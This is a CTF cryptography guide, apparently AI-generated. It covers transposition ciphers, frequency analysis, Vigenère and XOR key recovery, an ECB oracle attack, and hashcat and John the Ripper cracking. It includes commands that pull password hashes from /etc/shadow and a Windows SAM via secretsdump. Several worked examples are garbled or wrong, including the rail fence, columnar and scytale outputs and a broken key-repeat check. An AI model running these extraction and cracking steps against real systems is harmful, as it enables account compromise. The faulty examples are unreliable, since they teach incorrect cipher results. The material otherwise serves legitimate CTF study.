Transposition ciphers rearrange the plaintext without substituting characters, preserving the original alphabet while changing the message structure. Unlike substitution ciphers that replace letters, transposition ciphers maintain letter frequency analysis vulnerabilities while obscuring the message through positional manipulation. CTF implementations commonly appear in medium-difficulty cryptography challenges and hybrid cipher schemes.

### Rail Fence Cipher

The rail fence (zigzag) cipher arranges plaintext in a zigzag pattern across multiple "rails" (rows), then reads the ciphertext row by row. The rail count determines the depth of zigzag oscillation.

#### Encryption Process

Write plaintext in zigzag pattern downward and upward across N rails, then concatenate each rail sequentially. A message "HELLO WORLD" with 3 rails:

```
H   O   O   D
 E L   W R L
  L   (space)
```

Reading rails sequentially produces ciphertext: "HOODELEWRLL" (ignoring spaces for this example).

#### Decryption Methodology

Determine rail count (typically provided or brute-forced), calculate character count per rail, reconstruct the zigzag pattern, and read diagonally. The pattern repeats every `2*(rails-1)` characters.

#### CTF Tools and Commands

**Python Implementation for Encryption:**

```python
def rail_fence_encrypt(plaintext, rails):
    fence = [[] for _ in range(rails)]
    rail = 0
    direction = 1
    for char in plaintext:
        fence[rail].append(char)
        if rail == 0:
            direction = 1
        elif rail == rails - 1:
            direction = -1
        rail += direction
    return ''.join(''.join(f) for f in fence)
```

**Python Implementation for Decryption:**

```python
def rail_fence_decrypt(ciphertext, rails):
    fence = [[] for _ in range(rails)]
    rail = 0
    direction = 1
    for _ in ciphertext:
        if rail == 0:
            direction = 1
        elif rail == rails - 1:
            direction = -1
        fence[rail].append(None)
        rail += direction
    
    idx = 0
    for i in range(rails):
        for j in range(len(fence[i])):
            fence[i][j] = ciphertext[idx]
            idx += 1
    
    plaintext = []
    rail = 0
    direction = 1
    for _ in ciphertext:
        if rail == 0:
            direction = 1
        elif rail == rails - 1:
            direction = -1
        plaintext.append(fence[rail].pop(0))
        rail += direction
    return ''.join(plaintext)
```

**Kali Linux: Use `hashcat` or custom Python scripts for brute-forcing rail counts (typically 2-10):**

```bash
for rails in {2..10}; do python3 decrypt_rail_fence.py ciphertext $rails; done
```

#### Attack Vectors

Brute force rail counts from 2 to message length. Frequency analysis helps confirm correct decryption (English text shows expected letter distributions). Known plaintext attacks reveal rail count immediately.

---

### Columnar Transposition

Columnar transposition writes plaintext in rows under a keyword, then reads columns in alphabetical order of the keyword. This cipher is stronger than rail fence when keyword length increases.

#### Encryption Process

Write plaintext in rows under a keyword. Reorder columns alphabetically by keyword letters, then read column by column.

Example with keyword "SECRET" and plaintext "ATTACKATDAWN":

```
S E C R E T
A T T A C K
A T D A W N
```

Reorder by alphabetical order (C=1, E=2,3, R=4, S=5, T=6):

```
C E E R S T
T A C A A T
D T W A A N
```

Reading columns: "TTAD" (C), "ATA" (first E), "CAW" (second E), "AAA" (R), "ATA" (S), "TN" (T) → "TTADATACAWAAATATAN"

#### Decryption Methodology

Recover keyword, calculate column count, determine alphabetical order, reconstruct grid, and read row by row. Keyword length and message length determine exact character distribution per column.

#### CTF Tools and Commands

**Python Implementation for Encryption:**

```python
def columnar_transposition_encrypt(plaintext, keyword):
    cols = len(keyword)
    rows = -(-len(plaintext) // cols)  # ceiling division
    grid = []
    idx = 0
    for _ in range(rows):
        row = []
        for _ in range(cols):
            row.append(plaintext[idx] if idx < len(plaintext) else '')
            idx += 1
        grid.append(row)
    
    # Create sorted keyword indices
    sorted_indices = sorted(range(cols), key=lambda i: keyword[i])
    
    ciphertext = ''
    for col_idx in sorted_indices:
        for row in grid:
            if col_idx < len(row):
                ciphertext += row[col_idx]
    return ciphertext
```

**Python Implementation for Decryption:**

```python
def columnar_transposition_decrypt(ciphertext, keyword):
    cols = len(keyword)
    rows = len(ciphertext) // cols
    sorted_indices = sorted(range(cols), key=lambda i: keyword[i])
    
    grid = [[''] * cols for _ in range(rows)]
    idx = 0
    for col_idx in sorted_indices:
        for row in range(rows):
            grid[row][col_idx] = ciphertext[idx]
            idx += 1
    
    plaintext = ''.join(''.join(row) for row in grid)
    return plaintext
```

**Kali Linux: Dictionary attack on keywords:**

```bash
# Using CyberChef or custom Python with common word lists
for word in $(cat /usr/share/wordlists/rockyou.txt | head -1000); do 
    python3 decrypt_columnar.py ciphertext "$word" 2>/dev/null | grep -i "the\|and\|flag"; 
done
```

#### Attack Vectors

[Unverified] Columnar transposition with unknown keyword typically requires keyword brute-forcing if keyword length is known or guessable. Dictionary attacks using common keywords (CTF flags often use short keywords) succeed frequently. Known plaintext attacks recover keyword immediately. Frequency analysis of individual columns may reveal patterns if plaintext length exceeds keyword length significantly. Anagramming ciphertext columns against dictionary words aids keyword recovery.

---

### Route Cipher

Route ciphers arrange plaintext in geometric patterns (grids) and read ciphertext following a predetermined route through the grid. Different routes (spiral, zigzag, diagonal) produce different ciphertexts.

#### Encryption Process

Write plaintext into grid following one route, read output following a different route. Common combinations include:

- **Write rows, read columns** (transpose)
- **Write columns, read rows** (transpose variant)
- **Write rectangular grid, read spiral** (clockwise/counterclockwise)
- **Write diagonal, read row-by-row**

Example: Write "ATTACKATDAWN" in 3×4 grid row-wise, read column-wise:

```
A T T A
C K A T
D A W N
```

Reading columns: "ACDTAKAWTATN"

#### Decryption Methodology

Determine grid dimensions, identify read route, reconstruct write route, and extract plaintext. Route identification often requires analyzing ciphertext patterns or testing multiple routes.

#### CTF Tools and Commands

**Python Implementation (Row-Write, Column-Read):**

```python
def route_cipher_encrypt(plaintext, cols):
    rows = -(-len(plaintext) // cols)
    grid = []
    idx = 0
    for _ in range(rows):
        row = []
        for _ in range(cols):
            row.append(plaintext[idx] if idx < len(plaintext) else '')
            idx += 1
        grid.append(row)
    
    ciphertext = ''
    for col in range(cols):
        for row in range(rows):
            if col < len(grid[row]):
                ciphertext += grid[row][col]
    return ciphertext

def route_cipher_decrypt(ciphertext, cols):
    rows = -(-len(ciphertext) // cols)
    grid = [[''] * cols for _ in range(rows)]
    idx = 0
    for col in range(cols):
        for row in range(rows):
            if idx < len(ciphertext):
                grid[row][col] = ciphertext[idx]
                idx += 1
    
    plaintext = ''.join(''.join(row) for row in grid)
    return plaintext
```

**Spiral Route Implementation (Clockwise Write, Spiral Read):**

```python
def spiral_route(grid, clockwise=True):
    if not grid:
        return ''
    
    result = []
    top, bottom, left, right = 0, len(grid) - 1, 0, len(grid[0]) - 1
    
    while top <= bottom and left <= right:
        for col in range(left, right + 1):
            result.append(grid[top][col])
        top += 1
        
        for row in range(top, bottom + 1):
            result.append(grid[row][right])
        right -= 1
        
        if top <= bottom:
            for col in range(right, left - 1, -1):
                result.append(grid[bottom][col])
            bottom -= 1
        
        if left <= right:
            for row in range(bottom, top - 1, -1):
                result.append(grid[row][left])
            left += 1
    
    return ''.join(result)
```

**Kali Linux: Brute-force grid dimensions:**

```bash
for cols in {2..12}; do 
    python3 route_decrypt.py ciphertext_file $cols "row_to_col" | grep -i flag; 
done
```

#### Attack Vectors

[Inference] Route identification requires testing multiple grid dimensions and read patterns. Common routes (row-to-column transpose, spiral) should be tested first. Known plaintext of sufficient length (grid size or more) reveals the grid dimensions and route uniquely. Frequency analysis confirms correct route if result shows expected English text patterns.

---

### Scytale Cipher

The scytale is a transposition cipher using a physical rod. Plaintext wraps around a rod of specific diameter, then unwraps to produce ciphertext. Modern implementations use rail count as the equivalent parameter.

#### Encryption Process

Wrap plaintext around a rod of N turns (rail count), then read linearly. This is mathematically equivalent to columnar transposition where the keyword order is natural (no reordering).

Example: "ATTACKATDAWN" wrapped 3 times:

```
A T T A
C K A T
D A W N
```

Reading left-to-right, top-to-bottom: "ATTATACKADAWN" or reading columns if different read pattern applies.

#### Decryption Methodology

Determine rod diameter (rail/turn count), reconstruct wrap, and extract plaintext. Message length and known plaintext determine rail count.

#### CTF Tools and Commands

**Python Implementation:**

```python
def scytale_encrypt(plaintext, turns):
    cols = -(-len(plaintext) // turns)  # ceiling division
    grid = []
    idx = 0
    for _ in range(turns):
        row = []
        for _ in range(cols):
            row.append(plaintext[idx] if idx < len(plaintext) else '')
            idx += 1
        grid.append(row)
    
    ciphertext = ''.join(''.join(row) for row in grid)
    return ciphertext

def scytale_decrypt(ciphertext, turns):
    cols = -(-len(ciphertext) // turns)
    grid = [[''] * cols for _ in range(turns)]
    idx = 0
    for row in range(turns):
        for col in range(cols):
            if idx < len(ciphertext):
                grid[row][col] = ciphertext[idx]
                idx += 1
    
    plaintext = ''
    for col in range(cols):
        for row in range(turns):
            plaintext += grid[row][col]
    return plaintext
```

**Kali Linux: Brute-force turn counts:**

```bash
for turns in {2..$(echo ${#ciphertext}/2 | bc)}; do 
    python3 scytale_decrypt.py ciphertext $turns | grep -E "flag|FLAG|The"; 
done
```

#### Attack Vectors

Brute force turn counts from 2 to message length. Frequency analysis confirms correct decryption immediately (English plaintext shows expected letter distributions). Known plaintext attacks reveal turn count in one attempt.

---

### Practical CTF Attack Workflow

For unknown transposition cipher in CTF:

Determine cipher type by analyzing ciphertext properties. All-letters with preserved frequency suggests transposition. Test simple transpositions first (rail fence 2-8 rails, simple column swap). Use Python scripts for rapid testing across parameters. Implement word frequency analysis to verify candidates (English text shows "the", "and", "that" etc.). For hybrid schemes, identify component ciphers through length analysis and partial decryption attempts.

---

## Analysis & Attacks

### Frequency Analysis

Frequency analysis exploits the statistical properties of natural language to break substitution ciphers. In English plaintext, letter 'E' appears ~12.7% of the time, followed by 'T' (~9.1%), 'A' (~8.2%), and so on.

**Tools and Implementation**

```bash
# Python-based frequency analysis
python3 -c "
import collections
text = open('ciphertext.txt').read().upper()
freq = collections.Counter(c for c in text if c.isalpha())
for char, count in freq.most_common():
    print(f'{char}: {count} ({count/len([c for c in text if c.isalpha()])*100:.2f}%)')
"

# Using dcode.fr cipher identifier (manual tool)
curl -X POST "https://www.dcode.fr/api/" \
  -d "tool=cipher-identifier" \
  -d "input=$(cat ciphertext.txt)"
```

**CyberChef Recipe**

- Load ciphertext → Operations: "Frequency distribution" → Analyze output
- Common substitution: Map most frequent ciphertext letter to 'E', second to 'T', etc.

**Manual Analysis Workflow**

1. Calculate single letter frequencies
2. Identify digraph frequencies (TH, HE, AN, IN, ER)
3. Identify trigraph frequencies (THE, AND, ING, ION)
4. Map ciphertext characters to plaintext based on frequency matching
5. Iteratively refine by testing common words

**Advanced Technique - Chi-Squared Test**

```python
# chi_squared.py
def chi_squared(observed, expected):
    return sum((o - e)**2 / e for o, e in zip(observed, expected))

english_freq = [0.082, 0.015, 0.028, 0.043, 0.127, ...]  # A-Z frequencies
# Lower chi-squared value indicates closer match to English
```

**Limitations**

- Requires sufficient ciphertext length (minimum 100-200 characters for reliable results) [Inference]
- Fails against polyalphabetic ciphers (Vigenère, Enigma)
- Ineffective when plaintext is non-English or contains specialized vocabulary

---

### Caesar Brute Force

Caesar cipher shifts each letter by a fixed offset (1-25 possible keys). Brute force is the most efficient attack.

**Command-Line Tools**

```bash
# Using Python one-liner
for i in {0..25}; do 
  echo "Shift $i: $(echo 'KHOOR ZRUOG' | tr 'A-Z' "$(echo {A..Z} | tr -d ' ' | sed "s/\(.\{$i\}\)\(.*\)/\2\1/")")"; 
done

# Using CyberChef
# Input ciphertext → ROT13 Brute Force (Amount: 1-25, Step: 1)

# Using Python script
python3 << 'EOF'
cipher = "KHOOR ZRUOG"
for shift in range(26):
    plain = ''.join(chr((ord(c) - 65 - shift) % 26 + 65) if c.isalpha() else c 
                    for c in cipher.upper())
    print(f"Shift {shift:2d}: {plain}")
EOF
```

**Automated Detection**

```python
# caesar_breaker.py with English dictionary validation
import enchant

def caesar_decrypt(ciphertext, shift):
    return ''.join(chr((ord(c) - shift - 65) % 26 + 65) if c.isalpha() else c 
                   for c in ciphertext.upper())

d = enchant.Dict("en_US")
cipher = "KHOOR ZRUOG"

for shift in range(26):
    plain = caesar_decrypt(cipher, shift)
    words = plain.split()
    if sum(d.check(w) for w in words) / len(words) > 0.7:  # 70% valid words
        print(f"Likely plaintext (shift {shift}): {plain}")
```

**ROT13 Specific**

```bash
# ROT13 is Caesar with shift 13
echo "Uryyb Jbeyq" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# Python
import codecs
codecs.decode("Uryyb Jbeyq", 'rot_13')
```

**CTF Considerations**

- Check for case preservation (uppercase only, mixed case, or lowercase only)
- Non-alphabetic characters typically remain unchanged
- Some CTFs use Caesar on custom alphabets (Base64, hex, etc.)

---

### Vigenère Key Length Detection

Vigenère cipher uses a repeating keyword to shift letters. Key length detection is the critical first step before frequency analysis can be applied.

**Kasiski Examination**

Identifies repeated sequences in ciphertext. The distance between repetitions is likely a multiple of the key length.

```python
# kasiski.py
def find_repeats(ciphertext, min_length=3):
    repeats = {}
    for length in range(min_length, len(ciphertext) // 2):
        for i in range(len(ciphertext) - length):
            seq = ciphertext[i:i+length]
            if seq in repeats:
                repeats[seq].append(i)
            else:
                repeats[seq] = [i]
    return {k: v for k, v in repeats.items() if len(v) > 1}

def gcd_multiple(numbers):
    from math import gcd
    result = numbers[0]
    for n in numbers[1:]:
        result = gcd(result, n)
    return result

# Usage
cipher = "VHVSSPQUCEMRVBVBBBVHVSURQGIBDUGRNICJQUCERVUAXSSR"
repeats = find_repeats(cipher)
for seq, positions in repeats.items():
    distances = [positions[i+1] - positions[i] for i in range(len(positions)-1)]
    print(f"Sequence '{seq}': distances {distances}, GCD {gcd_multiple(distances)}")
```

**Index of Coincidence (IC)**

Measures probability that two randomly selected letters from text are identical. English text has IC ≈ 0.065-0.068; random text has IC ≈ 0.038.

```python
# index_of_coincidence.py
def calc_ic(text):
    text = ''.join(c for c in text.upper() if c.isalpha())
    n = len(text)
    freqs = [text.count(chr(i)) for i in range(65, 91)]
    ic = sum(f * (f - 1) for f in freqs) / (n * (n - 1))
    return ic

def find_key_length(ciphertext, max_length=20):
    for key_len in range(1, max_length + 1):
        subsequences = [''.join(ciphertext[i::key_len]) for i in range(key_len)]
        avg_ic = sum(calc_ic(sub) for sub in subsequences) / key_len
        print(f"Key length {key_len}: Average IC = {avg_ic:.4f}")
        if avg_ic > 0.060:  # Threshold for likely English
            print(f"  ^ Likely candidate")

# Usage
cipher = open('vigenere_cipher.txt').read()
find_key_length(cipher)
```

**Automated Tools**

```bash
# Using vigenere-solver (install: pip3 install vigenere)
python3 -c "
from vigenere import Vigenere
v = Vigenere(open('cipher.txt').read())
print('Detected key length:', v.key_length)
print('Decrypted:', v.decrypt())
"

# Using online tool (manual)
# https://www.dcode.fr/vigenere-cipher → Auto-solve
# https://www.guballa.de/vigenere-solver → Paste ciphertext → Analyze
```

**Combined Approach**

```python
# vigenere_crack.py
def crack_vigenere(ciphertext, suspected_key_length):
    # Split into Caesar-shifted columns
    columns = [''.join(ciphertext[i::suspected_key_length]) 
               for i in range(suspected_key_length)]
    
    key = ''
    for col in columns:
        # Frequency analysis on each column
        best_shift = 0
        best_score = float('inf')
        for shift in range(26):
            decrypted = ''.join(chr((ord(c) - shift - 65) % 26 + 65) 
                               for c in col.upper() if c.isalpha())
            score = chi_squared(decrypted)  # From frequency analysis section
            if score < best_score:
                best_score = score
                best_shift = shift
        key += chr(best_shift + 65)
    
    return key
```

**CTF Edge Cases**

- Key length = 1 is Caesar cipher
- Some CTFs use Vigenère with Base64-encoded ciphertext
- Look for known plaintext headers (flags often start with `flag{`, `CTF{`, etc.)

---

### Dictionary Attacks

Dictionary attacks test a precompiled list of potential plaintexts, keys, or passwords against cryptographic systems.

**Hash Cracking with Hashcat**

```bash
# Identify hash type
hashcat --help | grep -i "sha256"
hash-identifier <<< "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"

# Dictionary attack on MD5
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# Dictionary attack on SHA256
hashcat -m 1400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# With rules (leetspeak, capitalization variations)
hashcat -m 1400 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Combination attack (two wordlists combined)
hashcat -m 1400 -a 1 hash.txt dict1.txt dict2.txt

# Mask attack (dictionary + patterns)
hashcat -m 1400 -a 6 hash.txt rockyou.txt ?d?d?d  # password + 3 digits
```

**John the Ripper**

```bash
# Auto-detect hash format
john --format=raw-sha256 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Cracking with rules
john --wordlist=rockyou.txt --rules=Jumbo hash.txt

# Show cracked passwords
john --show hash.txt

# Custom wordlist generation
john --wordlist=base.txt --rules --stdout > custom_wordlist.txt
```

**Custom Wordlist Generation**

```bash
# CeWL - crawl website for wordlist
cewl -d 2 -m 5 https://target.com -w wordlist.txt

# crunch - generate patterns
crunch 8 8 -t flag@@@@  # flag + 4 lowercase letters
crunch 6 10 0123456789abcdef -o hex_wordlist.txt

# cupp - user-profiling wordlist
cupp -i  # Interactive mode for targeted wordlists
```

**Plaintext Dictionary Attack on Classical Ciphers**

```python
# vigenere_dict_attack.py
def vigenere_decrypt(ciphertext, key):
    plain = []
    key = key.upper()
    key_idx = 0
    for c in ciphertext.upper():
        if c.isalpha():
            shift = ord(key[key_idx % len(key)]) - 65
            plain.append(chr((ord(c) - shift - 65) % 26 + 65))
            key_idx += 1
        else:
            plain.append(c)
    return ''.join(plain)

# Try dictionary words as Vigenère keys
with open('/usr/share/wordlists/rockyou.txt', 'r', errors='ignore') as f:
    for line in f:
        key = line.strip()
        if 3 <= len(key) <= 15:  # Reasonable key length range
            plain = vigenere_decrypt(ciphertext, key)
            if 'flag{' in plain.lower() or 'ctf{' in plain.lower():
                print(f"Key found: {key}")
                print(f"Plaintext: {plain}")
                break
```

**CTF-Specific Wordlists**

```bash
# SecLists (comprehensive CTF wordlists)
git clone https://github.com/danielmiessler/SecLists.git

# Common CTF wordlists locations
/usr/share/wordlists/rockyou.txt       # 14M passwords
/usr/share/seclists/Passwords/         # Categorized lists
/usr/share/john/password.lst           # John default
/usr/share/dirb/wordlists/            # Web directories

# Generate CTF-themed wordlist
cat << 'EOF' > ctf_keys.txt
flag
key
secret
password
crypto
cipher
EOF
```

**Optimization Strategies**

- Use GPU acceleration with hashcat when available (`-O` flag for optimized kernels)
- Prioritize common passwords first (top 1000, then top 10k, then full rockyou.txt)
- For classical ciphers, filter dictionary by likely key lengths (Kasiski/IC results)

---

### Known Plaintext Attacks

Exploit scenarios where portions of plaintext-ciphertext pairs are known. Particularly effective against stream ciphers and some block cipher modes.

**XOR Key Recovery**

When plaintext and ciphertext are both known, XOR cipher key can be directly calculated.

```python
# xor_key_recovery.py
def xor_bytes(data1, data2):
    return bytes(a ^ b for a, b in zip(data1, data2))

# Known plaintext attack
plaintext = b"flag{this_is_the_start"
ciphertext = bytes.fromhex("1c0e1b5b4a5c5e5f5a5b5c5d5e5f6061")

# Recover key
key = xor_bytes(plaintext, ciphertext[:len(plaintext)])
print(f"Recovered key: {key}")

# Decrypt full ciphertext with recovered key
full_plain = xor_bytes(ciphertext, key * (len(ciphertext) // len(key) + 1))
print(f"Decrypted: {full_plain}")
```

**Vigenère Known Plaintext**

```python
# vigenere_known_plaintext.py
def recover_vigenere_key(plaintext, ciphertext):
    key = []
    plain = ''.join(c for c in plaintext.upper() if c.isalpha())
    cipher = ''.join(c for c in ciphertext.upper() if c.isalpha())
    
    for p, c in zip(plain, cipher):
        shift = (ord(c) - ord(p)) % 26
        key.append(chr(shift + 65))
    
    # Identify repeating pattern
    for key_len in range(1, len(key) + 1):
        if key[:key_len] * (len(key) // key_len + 1) == key + [None] * (key_len - len(key) % key_len):
            return ''.join(key[:key_len])
    return ''.join(key)

# Usage
plain = "the flag is"
cipher = "VHV SPTK ME"
key = recover_vigenere_key(plain, cipher)
print(f"Recovered key: {key}")
```

**Reused One-Time Pad (OTP) Attack**

Critical vulnerability when OTP is reused. Known as "many-time pad".

```python
# many_time_pad.py
def crib_drag(ciphertext1, ciphertext2, crib):
    """Try known plaintext (crib) at each position"""
    c1 = bytes.fromhex(ciphertext1)
    c2 = bytes.fromhex(ciphertext2)
    
    for i in range(len(c1) - len(crib)):
        # XOR crib with c1 to get key fragment
        key_fragment = xor_bytes(crib.encode(), c1[i:i+len(crib)])
        
        # XOR key fragment with c2 to get potential plaintext
        potential_plain = xor_bytes(key_fragment, c2[i:i+len(crib)])
        
        if potential_plain.isascii() and potential_plain.isprintable():
            print(f"Position {i}: {potential_plain.decode(errors='ignore')}")

# Example: Two messages encrypted with same key
c1 = "0e0a1b5b4a5c5e5f"
c2 = "1f1a0a4e5b6d4f6e"
crib_drag(c1, c2, "flag")
```

**Automated Crib Dragging Tool**

```bash
# Install xortool
pip3 install xortool

# Analyze multiple ciphertexts encrypted with same key
xortool-xor -f cipher1.bin -f cipher2.bin -o analysis.txt

# Manual crib dragging with CyberChef
# Recipe: XOR → XOR Brute Force → Filter by readable ASCII
```

**Block Cipher ECB Mode Attack**

ECB mode encrypts identical plaintext blocks to identical ciphertext blocks. [Inference: This is based on ECB's deterministic encryption property]

```python
# ecb_known_block.py
# Scenario: Encryption oracle with unknown prefix/suffix
def detect_ecb_block_size(oracle_func):
    """Feed increasing input sizes to detect block boundaries"""
    for i in range(1, 64):
        cipher = oracle_func(b'A' * i)
        if len(cipher) > len(oracle_func(b'A' * (i - 1))):
            return len(cipher) - len(oracle_func(b'A' * (i - 1)))

def extract_ecb_secret(oracle_func, block_size):
    """Byte-at-a-time ECB decryption (Matasano Crypto Challenge)"""
    secret = b''
    while True:
        # Craft input to align unknown byte at block boundary
        padding_len = (block_size - 1 - len(secret)) % block_size
        prefix = b'A' * padding_len
        
        # Get target block
        target_cipher = oracle_func(prefix)
        target_block = target_cipher[len(secret)//block_size * block_size: 
                                      (len(secret)//block_size + 1) * block_size]
        
        # Brute force next byte
        found = False
        for byte in range(256):
            test_input = prefix + secret + bytes([byte])
            test_cipher = oracle_func(test_input)
            test_block = test_cipher[:len(target_block)]
            
            if test_block == target_block:
                secret += bytes([byte])
                found = True
                break
        
        if not found:
            break
    
    return secret
```

**CTF Scenarios**

Common known plaintext scenarios in CTF:

- File headers (PNG: `\x89PNG`, JPEG: `\xff\xd8\xff`, PDF: `%PDF-`)
- Flag format (`flag{`, `CTF{`, `picoCTF{`)
- Standard protocol headers (HTTP: `GET /`, `POST /`)
- Common phrases in challenges ("The secret is", "Your key is")

```bash
# Hex editor for manual XOR key recovery
xxd plaintext.bin > plain.hex
xxd ciphertext.bin > cipher.hex
# Manually XOR corresponding bytes to find key pattern
```

**Important Limitations**

- [Unverified] Known plaintext attacks on modern ciphers like AES typically require impractical amounts of known plaintext-ciphertext pairs or specific implementation weaknesses
- Most effective against classical ciphers, stream ciphers, and ECB mode
- Does not work against properly implemented authenticated encryption (AES-GCM, ChaCha20-Poly1305)

---

### Important Related Topics

For comprehensive cryptographic exploitation, also study:

- **Padding Oracle Attacks** (CBC mode decryption without keys)
- **Timing Attacks** (exploiting implementation timing differences)
- **RSA Attacks** (small exponent, common modulus, Wiener's attack)
- **Hash Length Extension** (attacking MAC implementations)
- **Rainbow Tables** (precomputed hash reversals)

---

## Cryptography CTF Tools and Techniques

### Hashcat - GPU-Accelerated Password Cracking

#### Installation and Setup

```bash
# Kali Linux (pre-installed)
hashcat --version

# Verify GPU detection
hashcat -I

# Update if needed
apt update && apt install hashcat
```

#### Core Command Structure

```bash
hashcat -m [hash_mode] -a [attack_mode] [hash_file] [wordlist/mask] [options]
```

#### Hash Mode Identification

```bash
# Common CTF hash modes
-m 0     # MD5
-m 100   # SHA1
-m 1400  # SHA2-256
-m 1700  # SHA2-512
-m 3200  # bcrypt
-m 1800  # sha512crypt (Unix)
-m 500   # md5crypt (Unix)
-m 1000  # NTLM (Windows)
-m 5600  # NetNTLMv2
-m 13100 # Kerberos 5 TGS-REP
-m 18200 # Kerberos 5 AS-REP

# List all supported modes
hashcat --example-hashes | less
```

#### Attack Modes

**Dictionary Attack (Mode 0)**

```bash
# Basic dictionary attack
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# With rules for mutation
hashcat -m 0 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Multiple rules
hashcat -m 0 -a 0 hashes.txt rockyou.txt -r rules/best64.rule -r rules/toggles1.rule
```

**Combinator Attack (Mode 1)**

```bash
# Combines words from two wordlists
hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt

# Example: "password" + "123" = "password123"
```

**Mask Attack (Mode 3)**

```bash
# Brute force with patterns
# Character sets:
# ?l = lowercase (a-z)
# ?u = uppercase (A-Z)
# ?d = digits (0-9)
# ?s = special characters
# ?a = all characters
# ?b = binary (0x00-0xff)

# 8-character lowercase
hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l?l?l

# Password with 4 digits
hashcat -m 0 -a 3 hashes.txt password?d?d?d?d

# Custom character set
hashcat -m 0 -a 3 hashes.txt -1 ?l?d ?1?1?1?1?1?1

# Increment mode (tries lengths 4-8)
hashcat -m 0 -a 3 hashes.txt --increment --increment-min=4 --increment-max=8 ?a?a?a?a?a?a?a?a
```

**Hybrid Attacks (Modes 6 & 7)**

```bash
# Mode 6: Dictionary + Mask (appending)
hashcat -m 0 -a 6 hashes.txt rockyou.txt ?d?d?d?d

# Mode 7: Mask + Dictionary (prepending)
hashcat -m 0 -a 7 hashes.txt ?d?d?d?d rockyou.txt
```

#### Performance Optimization

```bash
# Workload profile (1=low, 2=default, 3=high, 4=nightmare)
hashcat -m 0 -a 0 hashes.txt wordlist.txt -w 3

# Specify device (GPU)
hashcat -m 0 -a 0 hashes.txt wordlist.txt -d 1

# Show device information
hashcat -I

# Benchmark specific hash type
hashcat -b -m 1000

# Optimized kernel (potentially less compatible)
hashcat -m 0 -a 0 hashes.txt wordlist.txt -O

# Disable self-test for speed
hashcat -m 0 -a 0 hashes.txt wordlist.txt --self-test-disable
```

#### Session Management

```bash
# Named session (auto-saves progress)
hashcat -m 0 -a 0 hashes.txt wordlist.txt --session=ctf_challenge

# Restore session
hashcat --session=ctf_challenge --restore

# Show session status
hashcat --session=ctf_challenge --status

# Remove session
hashcat --session=ctf_challenge --remove
```

#### Output and Results

```bash
# Show cracked passwords
hashcat -m 0 -a 0 hashes.txt wordlist.txt --show

# Output to file
hashcat -m 0 -a 0 hashes.txt wordlist.txt -o cracked.txt

# Output format (plain, custom)
hashcat -m 0 -a 0 hashes.txt wordlist.txt --outfile-format=2
# Formats: 1=hash:plain, 2=plain, 3=hex_plain, etc.

# Remove duplicates from potfile
hashcat --potfile-path=hashcat.potfile --remove
```

#### Hash Extraction and Formatting

**Linux Shadow File**

```bash
# Extract from /etc/shadow
unshadow /etc/passwd /etc/shadow > unshadowed.txt

# Format: username:$algorithm$salt$hash
# Example: user:$6$salt$hash (SHA-512)
```

**NTLM from Windows SAM**

```bash
# Using secretsdump.py (Impacket)
secretsdump.py -sam SAM -system SYSTEM LOCAL

# Format for hashcat: username:RID:LMhash:NTLMhash:::
```

**NetNTLMv2 from Network Capture**

```bash
# Responder capture format
# username::domain:challenge:response:response

# Use mode 5600 for NetNTLMv2
hashcat -m 5600 -a 0 netntlm.txt rockyou.txt
```

#### Advanced Techniques

**Rule-Based Attacks**

```bash
# Generate custom rules
# Rules syntax: c (capitalize), u (uppercase), l (lowercase), r (reverse), d (duplicate)

# Example rules file (custom.rule):
# c              # Capitalize first letter
# u              # All uppercase
# $1 $2 $3       # Append "123"
# ^S ^p          # Prepend "pS" (becomes "Sp")

hashcat -m 0 -a 0 hashes.txt wordlist.txt -r custom.rule

# Built-in rule files
ls /usr/share/hashcat/rules/
# best64.rule, leetspeak.rule, toggles1.rule, etc.
```

**Debug Mode**

```bash
# Show plaintext candidates (no cracking)
hashcat -m 0 -a 0 hashes.txt wordlist.txt --debug-mode=1 --debug-file=debug.txt

# Modes: 1=finding, 2=modify, 3=display, 4=all
```

**Custom Charset Attacks**

```bash
# Define up to 4 custom charsets
hashcat -m 0 -a 3 hashes.txt -1 ?l?u -2 ?d?s ?1?1?1?1?2?2

# Example: -1 defines charset1 (lowercase+uppercase)
#          -2 defines charset2 (digits+special)
#          Pattern: 4 chars from charset1, 2 from charset2
```

#### CTF-Specific Scenarios

**Weak Algorithm Detection**

```bash
# Identify hash type
hashid 5d41402abc4b2a76b9719d911017c592
hash-identifier

# Online databases (use cautiously in CTF)
# CrackStation, Hashes.com (may be disallowed)
```

**Salt Extraction**

```bash
# Many CTF challenges include salts
# Format: hash$salt or salt$hash

# For custom salts, modify hash input
# bcrypt example: $2a$10$salt$hash
```

**Wordlist Preparation**

```bash
# Combine and deduplicate wordlists
cat wordlist1.txt wordlist2.txt | sort -u > combined.txt

# Extract words from challenge files
strings binary_file >> custom_wordlist.txt

# Generate wordlist from pattern
crunch 8 8 -t password?d?d?d?d > custom.txt
```

---

### John the Ripper - CPU Password Cracker

#### Installation and Verification

```bash
# Kali Linux (pre-installed)
john --version

# Jumbo version (extended formats)
apt install john

# Verify available formats
john --list=formats
```

#### Basic Usage

```bash
# Automatic mode (detects format)
john hashes.txt

# Specify format
john --format=raw-md5 hashes.txt

# Using wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt
```

#### Format Specification

```bash
# Common formats
--format=raw-md5
--format=raw-sha1
--format=raw-sha256
--format=bcrypt
--format=sha512crypt      # Linux shadow $6$
--format=md5crypt         # Linux shadow $1$
--format=nt               # NTLM
--format=netntlmv2

# List all formats
john --list=formats | grep -i md5

# Test format validity
john --format=raw-md5 --test
```

#### Attack Modes

**Wordlist Mode**

```bash
# Basic wordlist attack
john --wordlist=wordlist.txt hashes.txt

# With rules
john --wordlist=rockyou.txt --rules hashes.txt

# Specific ruleset
john --wordlist=rockyou.txt --rules=Jumbo hashes.txt

# List available rules
john --list=rules
```

**Incremental Mode (Brute Force)**

```bash
# Default incremental (all characters)
john --incremental hashes.txt

# Specific character set
